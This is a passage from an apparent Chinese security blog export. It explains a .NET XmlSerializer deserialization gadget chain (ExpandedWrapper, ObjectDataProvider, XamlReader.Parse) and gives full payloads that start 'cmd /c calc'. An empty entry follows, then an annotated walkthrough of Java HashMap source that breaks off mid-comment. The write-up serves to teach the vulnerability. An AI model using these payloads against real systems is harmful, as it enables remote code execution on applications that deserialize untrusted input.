<p>到这里我们知道了通过<code>ExpandWrapper</code>包装<code>ObjectDataProvider</code>可以成功调用命令执行，但是这里有个问题就是我们的示例中调用的方法时自定义类<code>ProcessT</code>的<code>eval</code>方法，而在生产环境中是否存在这样一个可以进行命令执行的方法呢？<br>可能会有，但是这里不讨论，这里我们通过另一种方式解决<code>Process</code>不能序列化的问题。<br>通过前面的内容我们知道通过<code>ObjectDataProvider</code>可以调用任意类的任意方法，那么如果我们可以通过<code>XmlSerializer -&gt; ObjectDataProvider -&gt; xxx类xx方法 -&gt; objectDataProvider -&gt; Process</code>不一样可以解决问题？<br>这里需要满足的条件时<code>xxx类xxx方法</code>在调用到<code>ObjectDataprovider</code>的过程中不会出现前面提到的某些类不能序列化的问题。<br>这里找到的类以及方法为<code>XamlReader</code>的<code>parse</code>方法，该方法可以将<code>xaml</code>字符串反序列化为对应的数据对象。<br>使用如下格式的<code>payload</code>边可以触发命令执行。  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ResourceDictionary</span> </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//<span class="attr">schemas.microsoft.com</span>/<span class="attr">winfx</span>/<span class="attr">2006</span>/<span class="attr">xaml</span>/<span class="attr">presentation</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:d</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//<span class="attr">schemas.microsoft.com</span>/<span class="attr">winfx</span>/<span class="attr">2006</span>/<span class="attr">xaml</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:b</span>=<span class="string">&quot;&quot;</span><span class="attr">clr-namespace:System</span>;<span class="attr">assembly</span>=<span class="string">mscorlib</span>&quot;&quot; </span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:c</span>=<span class="string">&quot;&quot;</span><span class="attr">clr-namespace:System.Diagnostics</span>;<span class="attr">assembly</span>=<span class="string">system</span>&quot;&quot;&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ObjectDataProvider</span> <span class="attr">d:Key</span>=<span class="string">&quot;&quot;</span>&quot;&quot; <span class="attr">ObjectType</span>=<span class="string">&quot;&quot;</span>&#123;<span class="attr">d:Type</span> <span class="attr">c:Process</span>&#125;&quot;&quot; <span class="attr">MethodName</span>=<span class="string">&quot;&quot;</span><span class="attr">Start</span>&quot;&quot;&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ObjectDataProvider.MethodParameters</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">b:String</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">b:String</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">b:String</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">b:String</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ObjectDataProvider.MethodParameters</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ObjectDataProvider</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ResourceDictionary</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可用如下代码进行测试</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt;();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> XamlReader();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodName = <span class="string">&quot;Parse&quot;</span>;</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span class="string">@&quot;&lt;ResourceDictionary </span></span><br><span class="line"><span class="string">                    xmlns=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:d=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:b=&quot;&quot;clr-namespace:System;assembly=mscorlib&quot;&quot; </span></span><br><span class="line"><span class="string">                    xmlns:c=&quot;&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;ObjectDataProvider d:Key=&quot;&quot;&quot;&quot; ObjectType=&quot;&quot;&#123;d:Type c:Process&#125;&quot;&quot; MethodName=&quot;&quot;Start&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">                        &lt;b:String&gt;cmd&lt;/b:String&gt;</span></span><br><span class="line"><span class="string">                        &lt;b:String&gt;/c calc&lt;/b:String&gt;</span></span><br><span class="line"><span class="string">                    &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">                &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">            &lt;/ResourceDictionary&gt;</span></span><br><span class="line"><span class="string">            &quot;</span>);</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;XamlReader, ObjectDataProvider&gt;));</span><br><span class="line">            xml.Serialize(writer, expandedWrapper);</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            xml.Deserialize(memoryStream);</span><br><span class="line">            Console.ReadKey();</span><br></pre></td></tr></table></figure>
<p>那么接下来只需将<code>xaml</code>与通过<code>objectProvider</code>调用<code>XamlReader.Parse</code>方法的字符串结合起来即可<br><code>XmlSerializer</code>的<code>Deserialize</code>方法调用时先创建<code>ExpandWrapper</code>对象，在为<code>ExpandWrapper</code>的属性<code>ProjectedProperty0</code>赋值时会调用<code>Read7_ObjectDataProvider</code>方法创建<code>ObjectDataProvider</code>对象，<br><code>ObjectDataProvider</code>对象创建过程中会调用到<code>MethodName</code>的<code>set</code>访问器，然后触犯<code>XamlReader</code>的<code>Parse</code>方法对<code>ResourceDictionary</code>进行解析创建<code>ObjectDataProvider</code>这个资源，从而再次访问到<code>ObjectDataProvider</code>的<code>MethodName</code>属性的<code>set</code>访问器<br>从而调用到<code>Process</code>的<code>Start</code>方法，从而导致命令执行。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ExpandedWrapperOfXamlReaderObjectDataProvider</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">ExpandedElement</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MethodName</span>&gt;</span>Parse<span class="tag">&lt;/<span class="name">MethodName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MethodParameters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">anyType</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span></span><br><span class="line">                &lt;![CDATA[</span><br><span class="line">					&lt;ResourceDictionary </span><br><span class="line">						xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; </span><br><span class="line">						xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; </span><br><span class="line">						xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; </span><br><span class="line">						xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;</span><br><span class="line">						&lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;&#123;d:Type c:Process&#125;&quot; MethodName=&quot;Start&quot;&gt;</span><br><span class="line">							&lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">								&lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">								&lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">							&lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">						&lt;/ObjectDataProvider&gt;</span><br><span class="line">					&lt;/ResourceDictionary&gt;</span><br><span class="line">					]]&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">anyType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">MethodParameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ObjectInstance</span> <span class="attr">xsi:type</span>=<span class="string">&quot;XamlReader&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ObjectInstance</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ExpandedWrapperOfXamlReaderObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>C#</tag>
        <tag>BinnaryFormatter</tag>
        <tag>XmlSerializer</tag>
        <tag>ObjectDataProvider</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态代理在反序列化漏洞中的应用</title>
    <url>/archives/3792a892.html</url>
    <content><![CDATA[<p>test</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java HashMap 实现方法</title>
    <url>/archives/31bfcb8f.html</url>
    <content><![CDATA[<h1 id="成员变量含义"><a href="#成员变量含义" class="headerlink" title="成员变量含义"></a>成员变量含义</h1><table>
<thead>
<tr>
<th>变量名</th>
<th>默认值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>DEFAULT_INITIAL_CAPACITY</td>
<td>16</td>
<td>默认初始化容量</td>
</tr>
<tr>
<td>MAXIMUM_CAPACITY</td>
<td>1 &lt;&lt; 30</td>
<td>最大容量</td>
</tr>
<tr>
<td>DEFAULT_LOAD_FACTOR</td>
<td>0.75</td>
<td>默认加载因子，当数组中元素数量超过总长度的0.75的时候会进行自动扩容</td>
</tr>
<tr>
<td>TREEIFY_THRESHOLD</td>
<td>8</td>
<td>当链表长度超过8的时候会将链表转换为红黑树</td>
</tr>
<tr>
<td>UNTREEIFY_THRESHOLD</td>
<td>6</td>
<td>当链表元素少于6的时候会将红黑树转换为链表</td>
</tr>
<tr>
<td>MIN_TREEIFY_CAPACITY</td>
<td>64</td>
<td>只有当数组长度大于64的时候才会执行链表的树化，因为链表树化会增加空间复杂度，如果只要某一个链表长度超过8就进行树化得到的查询时间优化与增加的空间消耗两相比较是得不偿失的</td>
</tr>
</tbody></table>
<span id="more"></span>
<h1 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h1><p>包含三个重载方法，可提供对初始化容量以及加载因子的指定。不过一般使用无参构造方法就行</p>
<h1 id="put方法"><a href="#put方法" class="headerlink" title="put方法"></a>put方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// 首先调用hash方法计算key的hash值</span></span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    <span class="comment">// tab 通过key的hash索引的数组  p Node类型 表示链表的一个节点</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">        <span class="comment">// 通过无参构造方法创建时 table 为被指定大小，则调用resize方法被设置为初始化大小 16</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        <span class="comment">// 如果hash对应的索引未知为空 则直接创建一个新的链表节点放到该未知</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="comment">// 如果hash对应索引位置不为空且已存在节点与当前待添加元素key值相等则对值进行覆盖</span></span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="comment">// 如果当前节点是红黑树节点 则调用putTreeVal方法进行搜索添加</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 遍历链表节点</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 如果遍历到了链表的最后一个节点则直接将当前待添加元素添加到链表末尾</span></span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="comment">// 如果添加后链表长度超过了树化阈值 则对该链表进行树化</span></span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 如果链表中的某一个节点的key值与当前待添加元素的key值相等则对值进行覆盖</span></span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// 进行值覆盖</span></span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 标记hashmap结构修改次数</span></span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="comment">// 如果当前hashmap的数组长度超过了加载因子规定的阈值将对数组长度进行扩容</span></span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="树化"><a href="#树化" class="headerlink" title="树化"></a>树化</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> hash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n, index; Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="comment">// 如果数组长度小于最小树化尺寸则只进行扩容而不进行树化</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            resize();</span><br><span class="line">        <span class="comment">// 取得当前链表的头节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 将每一个链表节点都替换为红黑树节点TreeNode</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// TreeNode是一个双向链条节点</span></span><br><span class="line">                TreeNode&lt;K,V&gt; p = replacementTreeNode(e, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (tl == <span class="literal">null</span>)</span><br><span class="line">                    hd = p;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    p.prev = tl;</span><br><span class="line">                    tl.next = p;</span><br><span class="line">                &#125;</span><br><span class="line">                tl = p;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> ((tab[index] = hd) != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// 构建红黑树</span></span><br><span class="line">                hd.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeify</span><span class="params">(Node&lt;K,V&gt;[] tab)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; root = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = <span class="built_in">this</span>, next; x != <span class="literal">null</span>; x = next) &#123;</span><br><span class="line">                <span class="comment">// 获取双向链表的下一个节点</span></span><br><span class="line">                next = (TreeNode&lt;K,V&gt;)x.next;</span><br><span class="line">                <span class="comment">// 当前节点的左叶与右叶均初始化为空</span></span><br><span class="line">                x.left = x.right = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// 当为第一个节点的时候 root为null</span></span><br><span class="line">                <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 根节点是没有父节点的</span></span><br><span class="line">                    x.parent = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 根节点是黑色</span></span><br><span class="line">                    x.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="comment">// 此时获得了红黑树的根节点</span></span><br><span class="line">                    root = x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 当根节点不为空的时候  也就是进行第二次或者以上次数的循环，非双向链表第一个节点的时候</span></span><br><span class="line">        <span class="comment">// 现在我们假设正在进行第二轮循环</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 第二个节点的key</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> x.key;</span><br><span class="line">                    <span class="comment">// 第二个节点的hash</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> x.hash;</span><br><span class="line">                    Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// </span></span><br><span class="line">                    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123;</span><br><span class="line">                        <span class="type">int</span> dir, ph;</span><br><span class="line">                        <span class="comment">// 根几点的key</span></span><br><span class="line">                        <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key;</span><br><span class="line">                        <span class="comment">// 根节点的hash</span></span><br><span class="line">                        <span class="comment">// 如果根节点的hash大于当前节点的hash则 dir为-1</span></span><br><span class="line">                        <span class="comment">// 红黑树某个节点的左子叶的所有节点都要小于等于该节点的值，所有的右子叶的值都要大于等于该节点的值</span></span><br><span class="line">                        <span class="comment">// 所以这个dir因该是用来调整当前节点的插入位置 </span></span><br><span class="line">                        <span class="comment">// dir决定了谁前谁后</span></span><br><span class="line">                        <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                            dir = -<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                            dir = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">// 当两者hash相等时</span></span><br><span class="line">                        <span class="comment">// 同一个类型的对象 compareComparables 返回 0 然后调用tieBreakOrder进一步比较</span></span><br><span class="line">                        <span class="comment">// 不同类型的对向直接比较大小返回-1或1</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                                  (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                                 (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">                            <span class="comment">// 类型相同但是k 和 pk 时不同的两个对象他们的 identityHashCode 是不同的</span></span><br><span class="line">                            dir = tieBreakOrder(k, pk);</span><br><span class="line"></span><br><span class="line">                        TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">                        <span class="comment">// 如果dir 小于0 则证明前一节点比当前节点的hash值要大 当前节点就需要挂到前一节点的左叶上</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">                            x.parent = xp;</span><br><span class="line">                            <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                                xp.left = x;</span><br><span class="line">                            <span class="comment">// 否则挂到右叶</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                xp.right = x;</span><br><span class="line">                            <span class="comment">// 树的自平衡</span></span><br><span class="line">                            root = balanceInsertion(root, x);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将root移动到tab的第一个元素</span></span><br><span class="line">            moveRootToFront(tab, root);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h2 id="平衡红黑树"><a href="#平衡红黑树" class="headerlink" title="平衡红黑树"></a>平衡红黑树</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">balanceInsertion</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                                    TreeNode&lt;K,V&gt; x)</span> &#123;</span><br><span class="line">            <span class="comment">// 假设需要插入的节点是红色</span></span><br><span class="line">            <span class="comment">// 所有新插入节点均为红色</span></span><br><span class="line">            x.red = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//  xp x parent </span></span><br><span class="line">            <span class="comment">//  xpp  x parent parent</span></span><br><span class="line">            <span class="comment">// xppl xppr  left right</span></span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; xp, xpp, xppl, xppr;;) &#123;</span><br><span class="line">                <span class="comment">// 首先我们直到要调用到balanceInsertion 方法  x肯定不是树化的起始节点</span></span><br><span class="line">                <span class="comment">// 那么正常条件下x 的父节点为空的情况是不可能出现的</span></span><br><span class="line">                <span class="comment">// 所以这个判断的意义是什么呢？ </span></span><br><span class="line">                <span class="comment">//  左旋右旋平衡的时候 会依次向上寻找  如果碰到变色旋转后 父节点为空则证明当前节点时根节点了 将当前节点的颜色变为黑色退出。</span></span><br><span class="line">                <span class="keyword">if</span> ((xp = x.parent) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    x.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">return</span> x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果x的父节点不是红色即父节点为黑色 或者父节点的父节点为null 即x是从根节点向下第二层</span></span><br><span class="line">                <span class="comment">// 此时根节点不变 直接返回</span></span><br><span class="line">                <span class="comment">// 只有两层就没有平衡的必要了</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!xp.red || (xpp = xp.parent) == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// </span></span><br><span class="line">                    <span class="keyword">return</span> root;</span><br><span class="line">                <span class="comment">// 当存在三层的时候</span></span><br><span class="line">                <span class="comment">// 如果x的父节点为其祖父节点的左叶</span></span><br><span class="line">                <span class="keyword">if</span> (xp == (xppl = xpp.left)) &#123;</span><br><span class="line">                    <span class="comment">// 如果祖父节点的右叶不为空  且 右叶的颜色为红色   那么其父节点必定为黑色  父节点的左叶可红可黑</span></span><br><span class="line">                    <span class="comment">// 此时因为上一个else if 的原因 其父节点肯定是红色</span></span><br><span class="line">                    <span class="comment">// 祖父节点是黑色  父节点是红色  叔叔节点是红色 不满足红黑树规则不能出现两个连续的红色 </span></span><br><span class="line">                    <span class="comment">// 所以进行变色  父节点以及叔叔节点变成黑色 祖父节点变成红色</span></span><br><span class="line">                    <span class="keyword">if</span> ((xppr = xpp.right) != <span class="literal">null</span> &amp;&amp; xppr.red) &#123;</span><br><span class="line">                        xppr.red = <span class="literal">false</span>; <span class="comment">// 右叶设为黑色</span></span><br><span class="line">                        xp.red = <span class="literal">false</span>; <span class="comment">// 左叶设为黑色</span></span><br><span class="line">                        xpp.red = <span class="literal">true</span>; <span class="comment">// 祖父节点变成红色</span></span><br><span class="line">                        <span class="comment">// 将祖父节点设为 当前节点  继续循环 循环时获取祖父节点的父节点以及祖父节点 重复 </span></span><br><span class="line">                        <span class="comment">// 直到满足退出条件   其一 当前节点的父节点为空</span></span><br><span class="line">                        x = xpp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 祖父节点的右子叶为空</span></span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 当前节点时父节点的右子叶</span></span><br><span class="line">                        <span class="comment">// 当前节点 红色  父节点红色  祖父节点为黑色</span></span><br><span class="line">                        <span class="comment">//  不满足不能出现两个连续的红色的规则   但是其叔叔节点又为空(黑色)  故不需要变色 直接进行左旋</span></span><br><span class="line">                        <span class="comment">// 这种情况分两步完成 先要进行左旋  左旋完成后  当前节点是变成新的父节点  原本的父节点变成新的父节点的左子叶</span></span><br><span class="line">                        <span class="comment">// 此时仍然存在两个连续的红色节点  但是此时新的做下层子节点变成父节点的左叶了  可以进行右旋了</span></span><br><span class="line">                        <span class="keyword">if</span> (x == xp.right) &#123;</span><br><span class="line">                            <span class="comment">// 先进行左旋</span></span><br><span class="line">                            root = rotateLeft(root, x = xp);</span><br><span class="line">                            xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 如果是当前节点是父节点的坐子叶  直接进行右旋</span></span><br><span class="line">                        <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                            xp.red = <span class="literal">false</span>; <span class="comment">// 父节点变黑</span></span><br><span class="line">                            <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                xpp.red = <span class="literal">true</span>; <span class="comment">// 爷爷节点变红</span></span><br><span class="line">                                <span class="comment">// 右旋</span></span><br><span class="line">                                root = rotateRight(root, xpp);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// x的父节点为其祖父节点的右叶</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 叔叔节点不为空且为红色</span></span><br><span class="line">                    <span class="comment">// 叔叔节点与父节点均为红色  子节点也为红色  祖父节点为黑色</span></span><br><span class="line">                    <span class="comment">// 先变色  父节点与叔叔变黑   祖父节点变红</span></span><br><span class="line">                    <span class="keyword">if</span> (xppl != <span class="literal">null</span> &amp;&amp; xppl.red) &#123;</span><br><span class="line">                        xppl.red = <span class="literal">false</span>; <span class="comment">// 叔叔变黑</span></span><br><span class="line">                        xp.red = <span class="literal">false</span>; <span class="comment">// 父亲边黑</span></span><br><span class="line">                        xpp.red = <span class="literal">true</span>; <span class="comment">// 祖父变红</span></span><br><span class="line">                        <span class="comment">// 开启新一轮的循环</span></span><br><span class="line">                        x = xpp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 叔叔节点不存在</span></span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 如果当前节点是父节点的左子叶  先进行右旋再左旋</span></span><br><span class="line">                        <span class="keyword">if</span> (x == xp.left) &#123;</span><br><span class="line">                            <span class="comment">// 